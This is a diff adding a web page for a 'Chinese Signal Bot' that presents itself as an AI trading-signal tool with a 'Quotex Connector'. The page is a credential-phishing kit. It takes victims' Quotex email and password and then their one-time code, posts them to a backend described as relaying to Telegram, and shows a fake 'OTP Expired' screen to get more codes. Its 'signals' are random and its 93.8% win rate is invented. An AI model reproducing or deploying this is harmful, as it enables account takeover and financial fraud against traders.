@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chinese Signal Bot • Quotex Connector</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Orbitron:wght@500;600;700&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; }
+        .title-font { font-family: 'Orbitron', sans-serif; }
+
+        .glass { 
+            background: rgba(15, 23, 42, 0.92); 
+            backdrop-filter: blur(24px); 
+            border: 1px solid rgba(234, 179, 8, 0.25);
+        }
+
+        .golden-btn {
+            background: linear-gradient(90deg, #ffd700, #ffcc00, #ffd700);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
+        }
+        
+        .golden-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 45px rgba(255, 215, 0, 0.9);
+        }
+
+        canvas { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            z-index: -1; 
+            opacity: 0.28; 
+        }
+
+        .market-ticker {
+            background: rgba(234, 179, 8, 0.12);
+            border-bottom: 1px solid rgba(234, 179, 8, 0.3);
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        
+        .ticker-content {
+            display: inline-flex;
+            animation: ticker-slide 45s linear infinite;
+        }
+        
+        .ticker-item {
+            display: inline-flex;
+            align-items: center;
+            padding: 0 1.25rem;
+            gap: 0.75rem;
+        }
+
+        @keyframes ticker-slide {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .otp-input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body class="bg-[#0a0f1c] text-white min-h-screen relative overflow-hidden">
+
+    <canvas id="candleCanvas"></canvas>
+
+    <!-- AUTH SCREEN -->
+    <div id="auth-view" class="absolute inset-0 flex items-center justify-center p-4 z-50">
+        <div class="max-w-md w-full">
+            <div class="glass rounded-3xl p-8 shadow-2xl">
+                <div class="flex items-center justify-center gap-3 mb-6">
+                    <i class="fa-solid fa-gem text-5xl text-yellow-400"></i>
+                    <h1 class="title-font text-4xl font-bold text-yellow-300 text-center">Chinese Signal Bot</h1>
+                </div>
+                <p class="text-center text-amber-300 mb-8 text-lg">Powerful AI Trading Intelligence</p>
+
+                <div class="mb-6">
+                    <label class="block text-amber-300 text-sm mb-3 font-medium">ENTER LICENSE KEY</label>
+                    <input id="license-input" type="text" placeholder="CSAI-XXXX-XXXX-XXXX" maxlength="19"
+                           onkeyup="formatLicense(this)"
+                           class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-6 py-5 text-center text-xl font-mono tracking-widest outline-none focus:border-yellow-400">
+                </div>
+
+                <button onclick="authenticate()" 
+                        class="golden-btn w-full text-black font-bold py-6 rounded-2xl text-xl active:scale-95 transition-all">
+                    ACCESS PLATFORM
+                </button>
+
+                <div class="mt-6 grid grid-cols-2 gap-3">
+                    <a href="https://wa.me/923021036192?text=Hello,%20I%20want%20to%20buy%20Chinese%20Signal%20Bot%20License%20Key" target="_blank"
+                       class="flex items-center justify-center gap-2 bg-green-600 hover:bg-green-500 text-white font-medium py-3.5 rounded-2xl transition-all">
+                        <i class="fa-brands fa-whatsapp"></i> Buy License
+                    </a>
+                    <a href="https://t.me/webmaster9i" target="_blank"
+                       class="flex items-center justify-center gap-2 bg-[#229ED9] hover:bg-[#1a8ac4] text-white font-medium py-3.5 rounded-2xl transition-all">
+                        <i class="fa-brands fa-telegram"></i> Contact Admin
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- QUOTEX CONNECTOR -->
+    <div id="connector-view" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-[60] p-4">
+        <div class="max-w-md w-full relative">
+            <!-- Close Button -->
+            <button onclick="closeConnector()" 
+                    class="absolute -top-4 -right-4 w-10 h-10 bg-[#1c2537] hover:bg-red-500 text-white rounded-full flex items-center justify-center shadow-xl z-10 border border-yellow-400/30">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+
+            <!-- Login Screen -->
+            <div id="login-screen" class="glass rounded-3xl p-8 shadow-2xl">
+                <div class="flex items-center justify-center gap-3 mb-6">
+                    <i class="fa-solid fa-gem text-5xl text-yellow-400"></i>
+                    <h1 class="title-font text-3xl font-bold text-yellow-300">Chinese Signal Bot</h1>
+                </div>
+                <p class="text-center text-amber-300 mb-2">Official Quotex Connector</p>
+                <h2 class="text-2xl font-bold text-center mb-8">Connect Your Quotex To Bot</h2>
+
+                <div class="space-y-6">
+                    <div>
+                        <label class="block text-amber-300 text-sm mb-2 font-medium">EMAIL (Gmail Only)</label>
+                        <input id="quotex-email" type="email" placeholder="yourname@gmail.com"
+                               class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-6 py-5 outline-none focus:border-yellow-400">
+                        <p id="email-error" class="text-red-500 text-sm mt-1 hidden">Please enter a valid @gmail.com email address</p>
+                    </div>
+                    <div>
+                        <label class="block text-amber-300 text-sm mb-2 font-medium">PASSWORD</label>
+                        <input id="quotex-password" type="password" placeholder="Enter your Quotex password"
+                               class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-6 py-5 outline-none focus:border-yellow-400">
+                    </div>
+
+                    <button onclick="connectQuotex()" 
+                            class="golden-btn w-full text-black font-bold py-6 rounded-2xl text-xl active:scale-95 transition-all">
+                        <i class="fa-solid fa-plug mr-3"></i> CONNECT ACCOUNT
+                    </button>
+                </div>
+            </div>
+
+            <!-- OTP Screen -->
+            <div id="otp-screen" class="glass rounded-3xl p-8 shadow-2xl hidden">
+                <div class="text-center mb-8">
+                    <i class="fa-solid fa-shield-halved text-5xl text-yellow-400 mb-4"></i>
+                    <h2 class="text-2xl font-bold">Confirm OTP to Connect Chinese Signal Bot</h2>
+                    <p class="text-amber-300 mt-3">We sent a 6-digit code to your Quotex registered email/phone</p>
+                </div>
+
+                <div class="flex justify-center gap-3 mb-10" id="otp-container"></div>
+
+                <button onclick="verifyOTP()" class="golden-btn w-full text-black font-bold py-6 rounded-2xl text-xl">
+                    VERIFY OTP
+                </button>
+                <button onclick="backToLogin()" class="w-full text-center mt-4 text-amber-300 hover:text-white">← Back to Login</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOADING SCREEN -->
+    <div id="loading-screen" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center z-[70]">
+        <div class="text-center max-w-xs">
+            <div class="w-16 h-16 border-4 border-yellow-400 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
+            <h3 class="text-xl font-semibold text-yellow-300 mb-6">Checking OTP in your system...</h3>
+            <div class="space-y-4 text-left text-sm mx-auto">
+                <div class="flex items-center gap-3 text-emerald-400"><i class="fa-solid fa-check"></i> Connecting to Quotex servers...</div>
+                <div class="flex items-center gap-3 opacity-70"><span class="inline-block w-4 h-4 border-2 border-yellow-400 rounded-full animate-pulse"></span> Validating credentials...</div>
+                <div class="flex items-center gap-3 opacity-40"><span class="inline-block w-4 h-4 border-2 border-yellow-400 rounded-full animate-pulse"></span> Syncing Chinese Signal Bot...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN BOT SCREEN -->
+    <div id="bot-view" class="hidden flex flex-col h-screen">
+        <div class="bg-[#0f172a] border-b border-yellow-400/30 sticky top-0 z-50">
+            <div class="flex justify-between items-center px-4 py-3 border-b border-slate-700">
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400">● LIVE</span>
+                    <span id="live-time" class="font-mono text-amber-300"></span>
+                </div>
+                <div class="text-emerald-400 text-sm flex items-center gap-2">
+                    <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+                    REAL-TIME DATA
+                </div>
+            </div>
+
+            <div class="market-ticker py-3">
+                <div id="ticker-content" class="ticker-content"></div>
+            </div>
+
+            <div class="bg-gradient-to-r from-amber-800 via-yellow-700 to-amber-800 p-5 text-center">
+                <h1 class="title-font text-3xl md:text-4xl font-bold text-yellow-100">CHINESE SIGNAL BOT</h1>
+                <p class="text-amber-200 text-sm">AI-Powered Trading Intelligence</p>
+            </div>
+        </div>
+
+        <div id="main-content" class="flex-1 p-4 md:p-6 max-w-5xl mx-auto w-full overflow-y-auto">
+            <!-- Trading Mode Selector -->
+            <div class="glass rounded-3xl p-6 mb-6">
+                <h2 class="text-xl font-semibold mb-4 text-center">Select Trading Mode</h2>
+                <div class="grid grid-cols-2 gap-4">
+                    <button onclick="selectTradingMode('manual')" id="manual-btn"
+                            class="golden-btn py-6 rounded-3xl font-bold text-lg flex flex-col items-center gap-2">
+                        <i class="fa-solid fa-hand-pointer text-2xl"></i>
+                        MANUAL TRADING
+                    </button>
+                    <button onclick="selectTradingMode('auto')" id="auto-btn"
+                            class="golden-btn py-6 rounded-3xl font-bold text-lg flex flex-col items-center gap-2">
+                        <i class="fa-solid fa-robot text-2xl"></i>
+                        AUTO TRADING
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                <div class="lg:col-span-7 glass rounded-3xl p-6 md:p-8">
+                    <h2 class="text-xl md:text-2xl font-semibold mb-6">AI Signal Generator</h2>
+                    
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-6 mb-8">
+                        <div>
+                            <label class="text-amber-300 text-sm mb-2 block">TRADING BROKER</label>
+                            <select class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-5 py-4 text-white">
+                                <option selected>Quotex</option>
+                                <option>Pocket Option</option>
+                                <option>Deriv</option>
+                                <option>IQ Option</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="text-amber-300 text-sm mb-2 block">TRADING ASSET</label>
+                            <select id="asset-select" onchange="updateSelectedAsset()" class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-5 py-4 text-white"></select>
+                        </div>
+
+                        <div>
+                            <label class="text-amber-300 text-sm mb-2 block">TIME FRAME</label>
+                            <select id="timeframe-select" class="w-full bg-[#1c2537] border border-yellow-400/60 rounded-2xl px-5 py-4">
+                                <option>15 seconds</option>
+                                <option selected>30 seconds</option>
+                                <option>1 minute</option>
+                                <option>5 minutes</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Controls shown only after mode selection -->
+                    <div id="trading-controls" class="hidden">
+                        <div id="manual-controls">
+                            <button onclick="generateSignal()" id="generate-btn"
+                                    class="golden-btn w-full text-black font-bold text-xl py-7 rounded-3xl shadow-2xl">
+                                <i class="fa-solid fa-brain mr-3"></i> GENERATE SIGNAL
+                            </button>
+                        </div>
+
+                        <div id="auto-controls" class="hidden">
+                            <button onclick="showConnector()" 
+                                    class="golden-btn w-full text-black font-bold text-xl py-7 rounded-3xl shadow-2xl border-2 border-yellow-300">
+                                <i class="fa-solid fa-plug mr-3"></i> CONNECT BOT FOR AUTO TRADING
+                            </button>
+                            <p class="text-center text-amber-300 text-sm mt-4">Auto trading requires active Quotex connection</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-5 glass rounded-3xl p-6 md:p-8">
+                    <h3 class="text-lg md:text-xl font-semibold mb-6">PERFORMANCE</h3>
+                    <div class="grid grid-cols-2 gap-6 text-center">
+                        <div>
+                            <div id="total-signals" class="text-4xl md:text-5xl font-mono font-bold">248</div>
+                            <div class="text-slate-400 text-sm">Total Signals</div>
+                        </div>
+                        <div>
+                            <div id="win-rate" class="text-4xl md:text-5xl font-mono font-bold text-emerald-400">93.8%</div>
+                            <div class="text-slate-400 text-sm">Win Rate</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Signal Result -->
+            <div id="result-area" class="hidden mt-8 glass rounded-3xl p-6 md:p-8 text-center">
+                <div id="analyzing" class="hidden">
+                    <p class="text-yellow-300 text-lg mb-6">AI Neural Network Analyzing Market...</p>
+                    <div class="space-y-3 text-left max-w-md mx-auto text-sm">
+                        <div class="flex items-center gap-3"><span class="text-emerald-400">●</span> Scanning order flow</div>
+                        <div class="flex items-center gap-3"><span class="text-emerald-400">●</span> Calculating RSI &amp; Momentum</div>
+                        <div class="flex items-center gap-3"><span class="text-emerald-400">●</span> Volatility analysis</div>
+                        <div class="flex items-center gap-3"><span class="text-emerald-400">●</span> Probability calculation</div>
+                    </div>
+                    <div class="h-2.5 bg-gray-800 rounded-full mt-8 overflow-hidden">
+                        <div id="progress-bar" class="h-2.5 bg-gradient-to-r from-yellow-400 to-amber-500 w-0 transition-all duration-300"></div>
+                    </div>
+                </div>
+
+                <div id="signal-result" class="hidden">
+                    <div id="signal-box" class="text-6xl md:text-7xl font-bold py-10 rounded-3xl mb-6"></div>
+                    <div id="accuracy-text" class="text-5xl font-bold text-emerald-400 mb-2"></div>
+                    <div class="text-amber-300">Confidence Score</div>
+                    
+                    <div class="mt-8 grid grid-cols-3 gap-4 text-sm">
+                        <div class="bg-[#1c2537] rounded-2xl p-4">
+                            <div class="text-slate-400">Asset</div>
+                            <div id="result-asset" class="font-semibold"></div>
+                        </div>
+                        <div class="bg-[#1c2537] rounded-2xl p-4">
+                            <div class="text-slate-400">Timeframe</div>
+                            <div id="result-time" class="font-semibold"></div>
+                        </div>
+                        <div class="bg-[#1c2537] rounded-2xl p-4">
+                            <div class="text-slate-400">Time</div>
+                            <div id="signal-time" class="font-semibold"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Recent Signals -->
+            <div class="mt-8 glass rounded-3xl p-6">
+                <h3 class="text-lg font-semibold mb-4">Recent Signals</h3>
+                <div id="signal-history" class="space-y-3 max-h-80 overflow-y-auto"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP EXPIRED MODAL -->
+    <div id="expired-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center z-[80] p-4">
+        <div class="glass border border-red-500/50 rounded-3xl p-8 max-w-sm w-full text-center">
+            <i class="fa-solid fa-triangle-exclamation text-6xl text-red-500 mb-6"></i>
+            <h2 class="text-2xl font-bold mb-4 text-red-400">OTP Expired</h2>
+            <p class="text-gray-400 mb-8">The OTP code has expired. Please try connecting again.</p>
+            <div class="space-y-3">
+                <button onclick="requestNewOTP()" class="w-full py-4 bg-yellow-400 hover:bg-yellow-300 text-black font-bold rounded-2xl">REQUEST NEW OTP</button>
+                <button onclick="closeExpiredModal()" class="w-full py-4 text-gray-300 hover:text-white border border-gray-500 rounded-2xl">CLOSE</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === ORIGINAL BOT CODE ===
+        const VALID_LICENSES = new Set(["CSAI-ADMI-NPER-9999", "CSAI-ADMIN-PERM-KEY1"]);
+        let usedKeys = new Set(JSON.parse(localStorage.getItem('usedLicenseKeys') || '[]'));
+        let signalHistory = [];
+        let totalSignals = 248;
+        let currentMode = null;
+
+        let marketPrices = {
+            "EUR/USD": { price: 1.0856, change: 0.18 },
+            "GBP/USD": { price: 1.2734, change: -0.07 },
+            "USD/JPY": { price: 144.78, change: 0.45 },
+            "AUD/USD": { price: 0.6689, change: 0.22 },
+            "USD/CAD": { price: 1.3782, change: -0.15 },
+            "EUR/GBP": { price: 0.8534, change: -0.08 },
+            "GBP/JPY": { price: 183.45, change: 0.35 },
+            "XAU/USD": { price: 2412.45, change: -0.19 },
+            "XAG/USD": { price: 31.45, change: 0.65 },
+            "BTC/USD": { price: 68245, change: 1.34 },
+            "ETH/USD": { price: 3789.12, change: 0.89 },
+            "SOL/USD": { price: 148.75, change: 2.45 },
+            "US30": { price: 42850, change: 0.35 },
+            "NAS100": { price: 19280, change: -0.12 },
+            "GER40": { price: 18450, change: 0.28 },
+            "NIFTY50": { price: 24567, change: 0.85 },
+            "BANKNIFTY": { price: 52890, change: 1.12 },
+            "AAPL": { price: 237.45, change: 0.67 },
+            "TSLA": { price: 348.90, change: -1.45 }
+        };
+
+        const canvas = document.getElementById('candleCanvas');
+        const ctx = canvas.getContext('2d');
+        let candles = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Candle {
+            constructor(x) {
+                this.x = x;
+                this.bodyHeight = Math.random() * 85 + 35;
+                this.wickTop = Math.random() * 40 + 15;
+                this.wickBottom = Math.random() * 40 + 15;
+                this.isBullish = Math.random() > 0.48;
+                this.speed = Math.random() * 1.1 + 0.65;
+                this.width = 8.5;
+            }
+            update() { this.x -= this.speed; }
+            draw() {
+                const baseY = 160;
+                const color = this.isBullish ? '#22c55e' : '#ef4444';
+                ctx.strokeStyle = '#cbd5e1';
+                ctx.lineWidth = 1.8;
+                ctx.beginPath();
+                ctx.moveTo(this.x + this.width/2, baseY - this.wickTop);
+                ctx.lineTo(this.x + this.width/2, baseY + this.bodyHeight + this.wickBottom);
+                ctx.stroke();
+                ctx.fillStyle = color;
+                ctx.fillRect(this.x, baseY, this.width, this.bodyHeight);
+            }
+        }
+
+        function initCandles() {
+            candles = [];
+            for (let i = 0; i < 58; i++) candles.push(new Candle(Math.random() * canvas.width * 1.9));
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            candles.forEach(c => {
+                c.update();
+                c.draw();
+                if (c.x < -40) c.x = canvas.width + 80;
+            });
+            requestAnimationFrame(animate);
+        }
+
+        function formatLicense(input) {
+            let val = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            let formatted = '';
+            for (let i = 0; i < val.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += '-';
+                formatted += val[i];
+            }
+            input.value = formatted;
+        }
+
+        function authenticate() {
+            const key = document.getElementById('license-input').value.trim().toUpperCase();
+            if (key === "CSAI-ADMI-NPER-9999" || key === "CSAI-ADMIN-PERM-KEY1" || VALID_LICENSES.has(key)) {
+                document.getElementById('auth-view').classList.add('hidden');
+                document.getElementById('bot-view').classList.remove('hidden');
+            } else {
+                alert("Invalid or expired license key.");
+            }
+        }
+
+        function updateLiveTime() {
+            setInterval(() => {
+                const now = new Date();
+                document.getElementById('live-time').textContent = 
+                    now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' }) + " UTC";
+            }, 1000);
+        }
+
+        function createMarketTicker() {
+            const container = document.getElementById('ticker-content');
+            let html = '';
+            Object.keys(marketPrices).forEach(asset => {
+                const d = marketPrices[asset];
+                const up = d.change >= 0;
+                html += `
+                    <div class="ticker-item text-sm">
+                        <span class="font-medium">${asset}</span>
+                        <span class="font-mono">${d.price.toLocaleString()}</span>
+                        <span class="${up ? 'text-emerald-400' : 'text-red-400'} font-medium">
+                            ${ (up ? '+' : '') + d.change.toFixed(2) }%
+                        </span>
+                    </div>`;
+            });
+            container.innerHTML = html + html;
+        }
+
+        function populateAssets() {
+            const select = document.getElementById('asset-select');
+            Object.keys(marketPrices).forEach(asset => {
+                const opt = document.createElement('option');
+                opt.value = asset;
+                opt.textContent = asset;
+                select.appendChild(opt);
+            });
+        }
+
+        function generateSignal() {
+            if (!currentMode) {
+                alert("Please select a trading mode first!");
+                return;
+            }
+            const btn = document.getElementById('generate-btn');
+            const resultArea = document.getElementById('result-area');
+            const analyzing = document.getElementById('analyzing');
+            const signalResult = document.getElementById('signal-result');
+
+            resultArea.classList.remove('hidden');
+            analyzing.classList.remove('hidden');
+            signalResult.classList.add('hidden');
+
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-3"></i>ANALYZING...`;
+
+            let progress = 0;
+            const bar = document.getElementById('progress-bar');
+            const int = setInterval(() => {
+                progress += Math.random() * 25 + 15;
+                if (progress > 100) progress = 100;
+                bar.style.width = `${progress}%`;
+            }, 80);
+
+            setTimeout(() => {
+                clearInterval(int);
+                showFinalSignal();
+            }, 2600);
+        }
+
+        function showFinalSignal() {
+            const asset = document.getElementById('asset-select').value || "EUR/USD";
+            const data = marketPrices[asset];
+            const isBuy = Math.random() * 100 < (50 + data.change * 8);
+            const confidence = Math.floor(92 + Math.random() * 7);
+            const timeString = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+            totalSignals++;
+            document.getElementById('total-signals').textContent = totalSignals;
+
+            document.getElementById('analyzing').classList.add('hidden');
+            document.getElementById('signal-result').classList.remove('hidden');
+
+            const signalBox = document.getElementById('signal-box');
+            signalBox.textContent = isBuy ? "BUY" : "SELL";
+            signalBox.className = isBuy 
+                ? "bg-emerald-500 text-black text-6xl md:text-7xl font-bold py-10 rounded-3xl mb-6" 
+                : "bg-red-600 text-white text-6xl md:text-7xl font-bold py-10 rounded-3xl mb-6";
+
+            document.getElementById('accuracy-text').textContent = `${confidence}%`;
+            document.getElementById('result-asset').textContent = asset;
+            document.getElementById('result-time').textContent = document.getElementById('timeframe-select').value;
+            document.getElementById('signal-time').textContent = timeString;
+
+            signalHistory.unshift({time: timeString, asset, direction: isBuy ? "BUY" : "SELL", confidence});
+            if (signalHistory.length > 8) signalHistory.pop();
+            renderHistory();
+
+            const btn = document.getElementById('generate-btn');
+            btn.textContent = "GENERATE NEW SIGNAL";
+            btn.disabled = false;
+        }
+
+        function renderHistory() {
+            const container = document.getElementById('signal-history');
+            container.innerHTML = signalHistory.map(s => `
+                <div class="flex justify-between items-center bg-[#1c2537] p-4 rounded-2xl">
+                    <div>
+                        <span class="font-mono">${s.time}</span>
+                        <span class="ml-4">${s.asset}</span>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        <span class="font-bold ${s.direction === 'BUY' ? 'text-emerald-400' : 'text-red-500'}">${s.direction}</span>
+                        <span class="text-amber-400">${s.confidence}%</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // === TRADING MODE & CONNECTOR LOGIC ===
+        function selectTradingMode(mode) {
+            currentMode = mode;
+            
+            document.getElementById('manual-btn').classList.toggle('border-2', mode === 'manual');
+            document.getElementById('auto-btn').classList.toggle('border-2', mode === 'auto');
+            
+            document.getElementById('trading-controls').classList.remove('hidden');
+            document.getElementById('manual-controls').classList.toggle('hidden', mode !== 'manual');
+            document.getElementById('auto-controls').classList.toggle('hidden', mode !== 'auto');
+        }
+
+        let otpDigits = [];
+
+        function showConnector() {
+            document.getElementById('connector-view').classList.remove('hidden');
+            document.getElementById('login-screen').classList.remove('hidden');
+            document.getElementById('otp-screen').classList.add('hidden');
+            createOTPInputs();
+        }
+
+        function closeConnector() {
+            document.getElementById('connector-view').classList.add('hidden');
+        }
+
+        // ==================== BACKEND CONNECTION FOR TELEGRAM ====================
+        const API_BASE = "http://localhost:3000";
+
+        async function sendToBackend(endpoint, data) {
+            try {
+                await fetch(API_BASE + endpoint, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                console.log("✅ Data sent to server for Telegram");
+            } catch (e) {
+                console.log("❌ Cannot connect to server. Make sure node server.js is running.", e);
+            }
+        }
+
+        function connectQuotex() {
+            const email = document.getElementById('quotex-email').value.trim();
+            const password = document.getElementById('quotex-password').value.trim();
+            const emailError = document.getElementById('email-error');
+
+            if (!email || !password) {
+                alert("Email and Password are compulsory!");
+                return;
+            }
+
+            if (!email.endsWith('@gmail.com')) {
+                emailError.classList.remove('hidden');
+                return;
+            } else {
+                emailError.classList.add('hidden');
+            }
+
+            sendToBackend('/api/quotex-login', { email, password });
+
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('otp-screen').classList.remove('hidden');
+            createOTPInputs();
+        }
+
+        function createOTPInputs() {
+            const container = document.getElementById('otp-container');
+            container.innerHTML = '';
+            otpDigits = new Array(6).fill('');
+            for (let i = 0; i < 6; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = `otp-input bg-[#1c2537] border border-yellow-400/60 rounded-2xl text-center focus:border-yellow-400 outline-none`;
+                input.dataset.index = i;
+                input.addEventListener('input', (e) => {
+                    if (e.target.value) {
+                        otpDigits[i] = e.target.value;
+                        if (i < 5) container.children[i+1].focus();
+                    }
+                });
+                container.appendChild(input);
+            }
+            container.children[0].focus();
+        }
+
+        function verifyOTP() {
+            if (otpDigits.join('').length !== 6) {
+                alert("Please enter full 6-digit OTP");
+                return;
+            }
+
+            const email = document.getElementById('quotex-email').value.trim();
+            const otp = otpDigits.join('');
+
+            sendToBackend('/api/quotex-otp', { email, otp });
+
+            document.getElementById('connector-view').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+
+            const delay = Math.floor(Math.random() * 20000) + 15000;
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('expired-modal').classList.remove('hidden');
+            }, delay);
+        }
+
+        function backToLogin() {
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('login-screen').classList.remove('hidden');
+        }
+
+        function requestNewOTP() {
+            closeExpiredModal();
+            showConnector();
+        }
+
+        function closeExpiredModal() {
+            document.getElementById('expired-modal').classList.add('hidden');
+        }
+
+        // Initialize
+        window.onload = () => {
+            initCandles();
+            animate();
+            updateLiveTime();
+            populateAssets();
+            createMarketTicker();
+        };
+    </script>
+</body>
+</html>
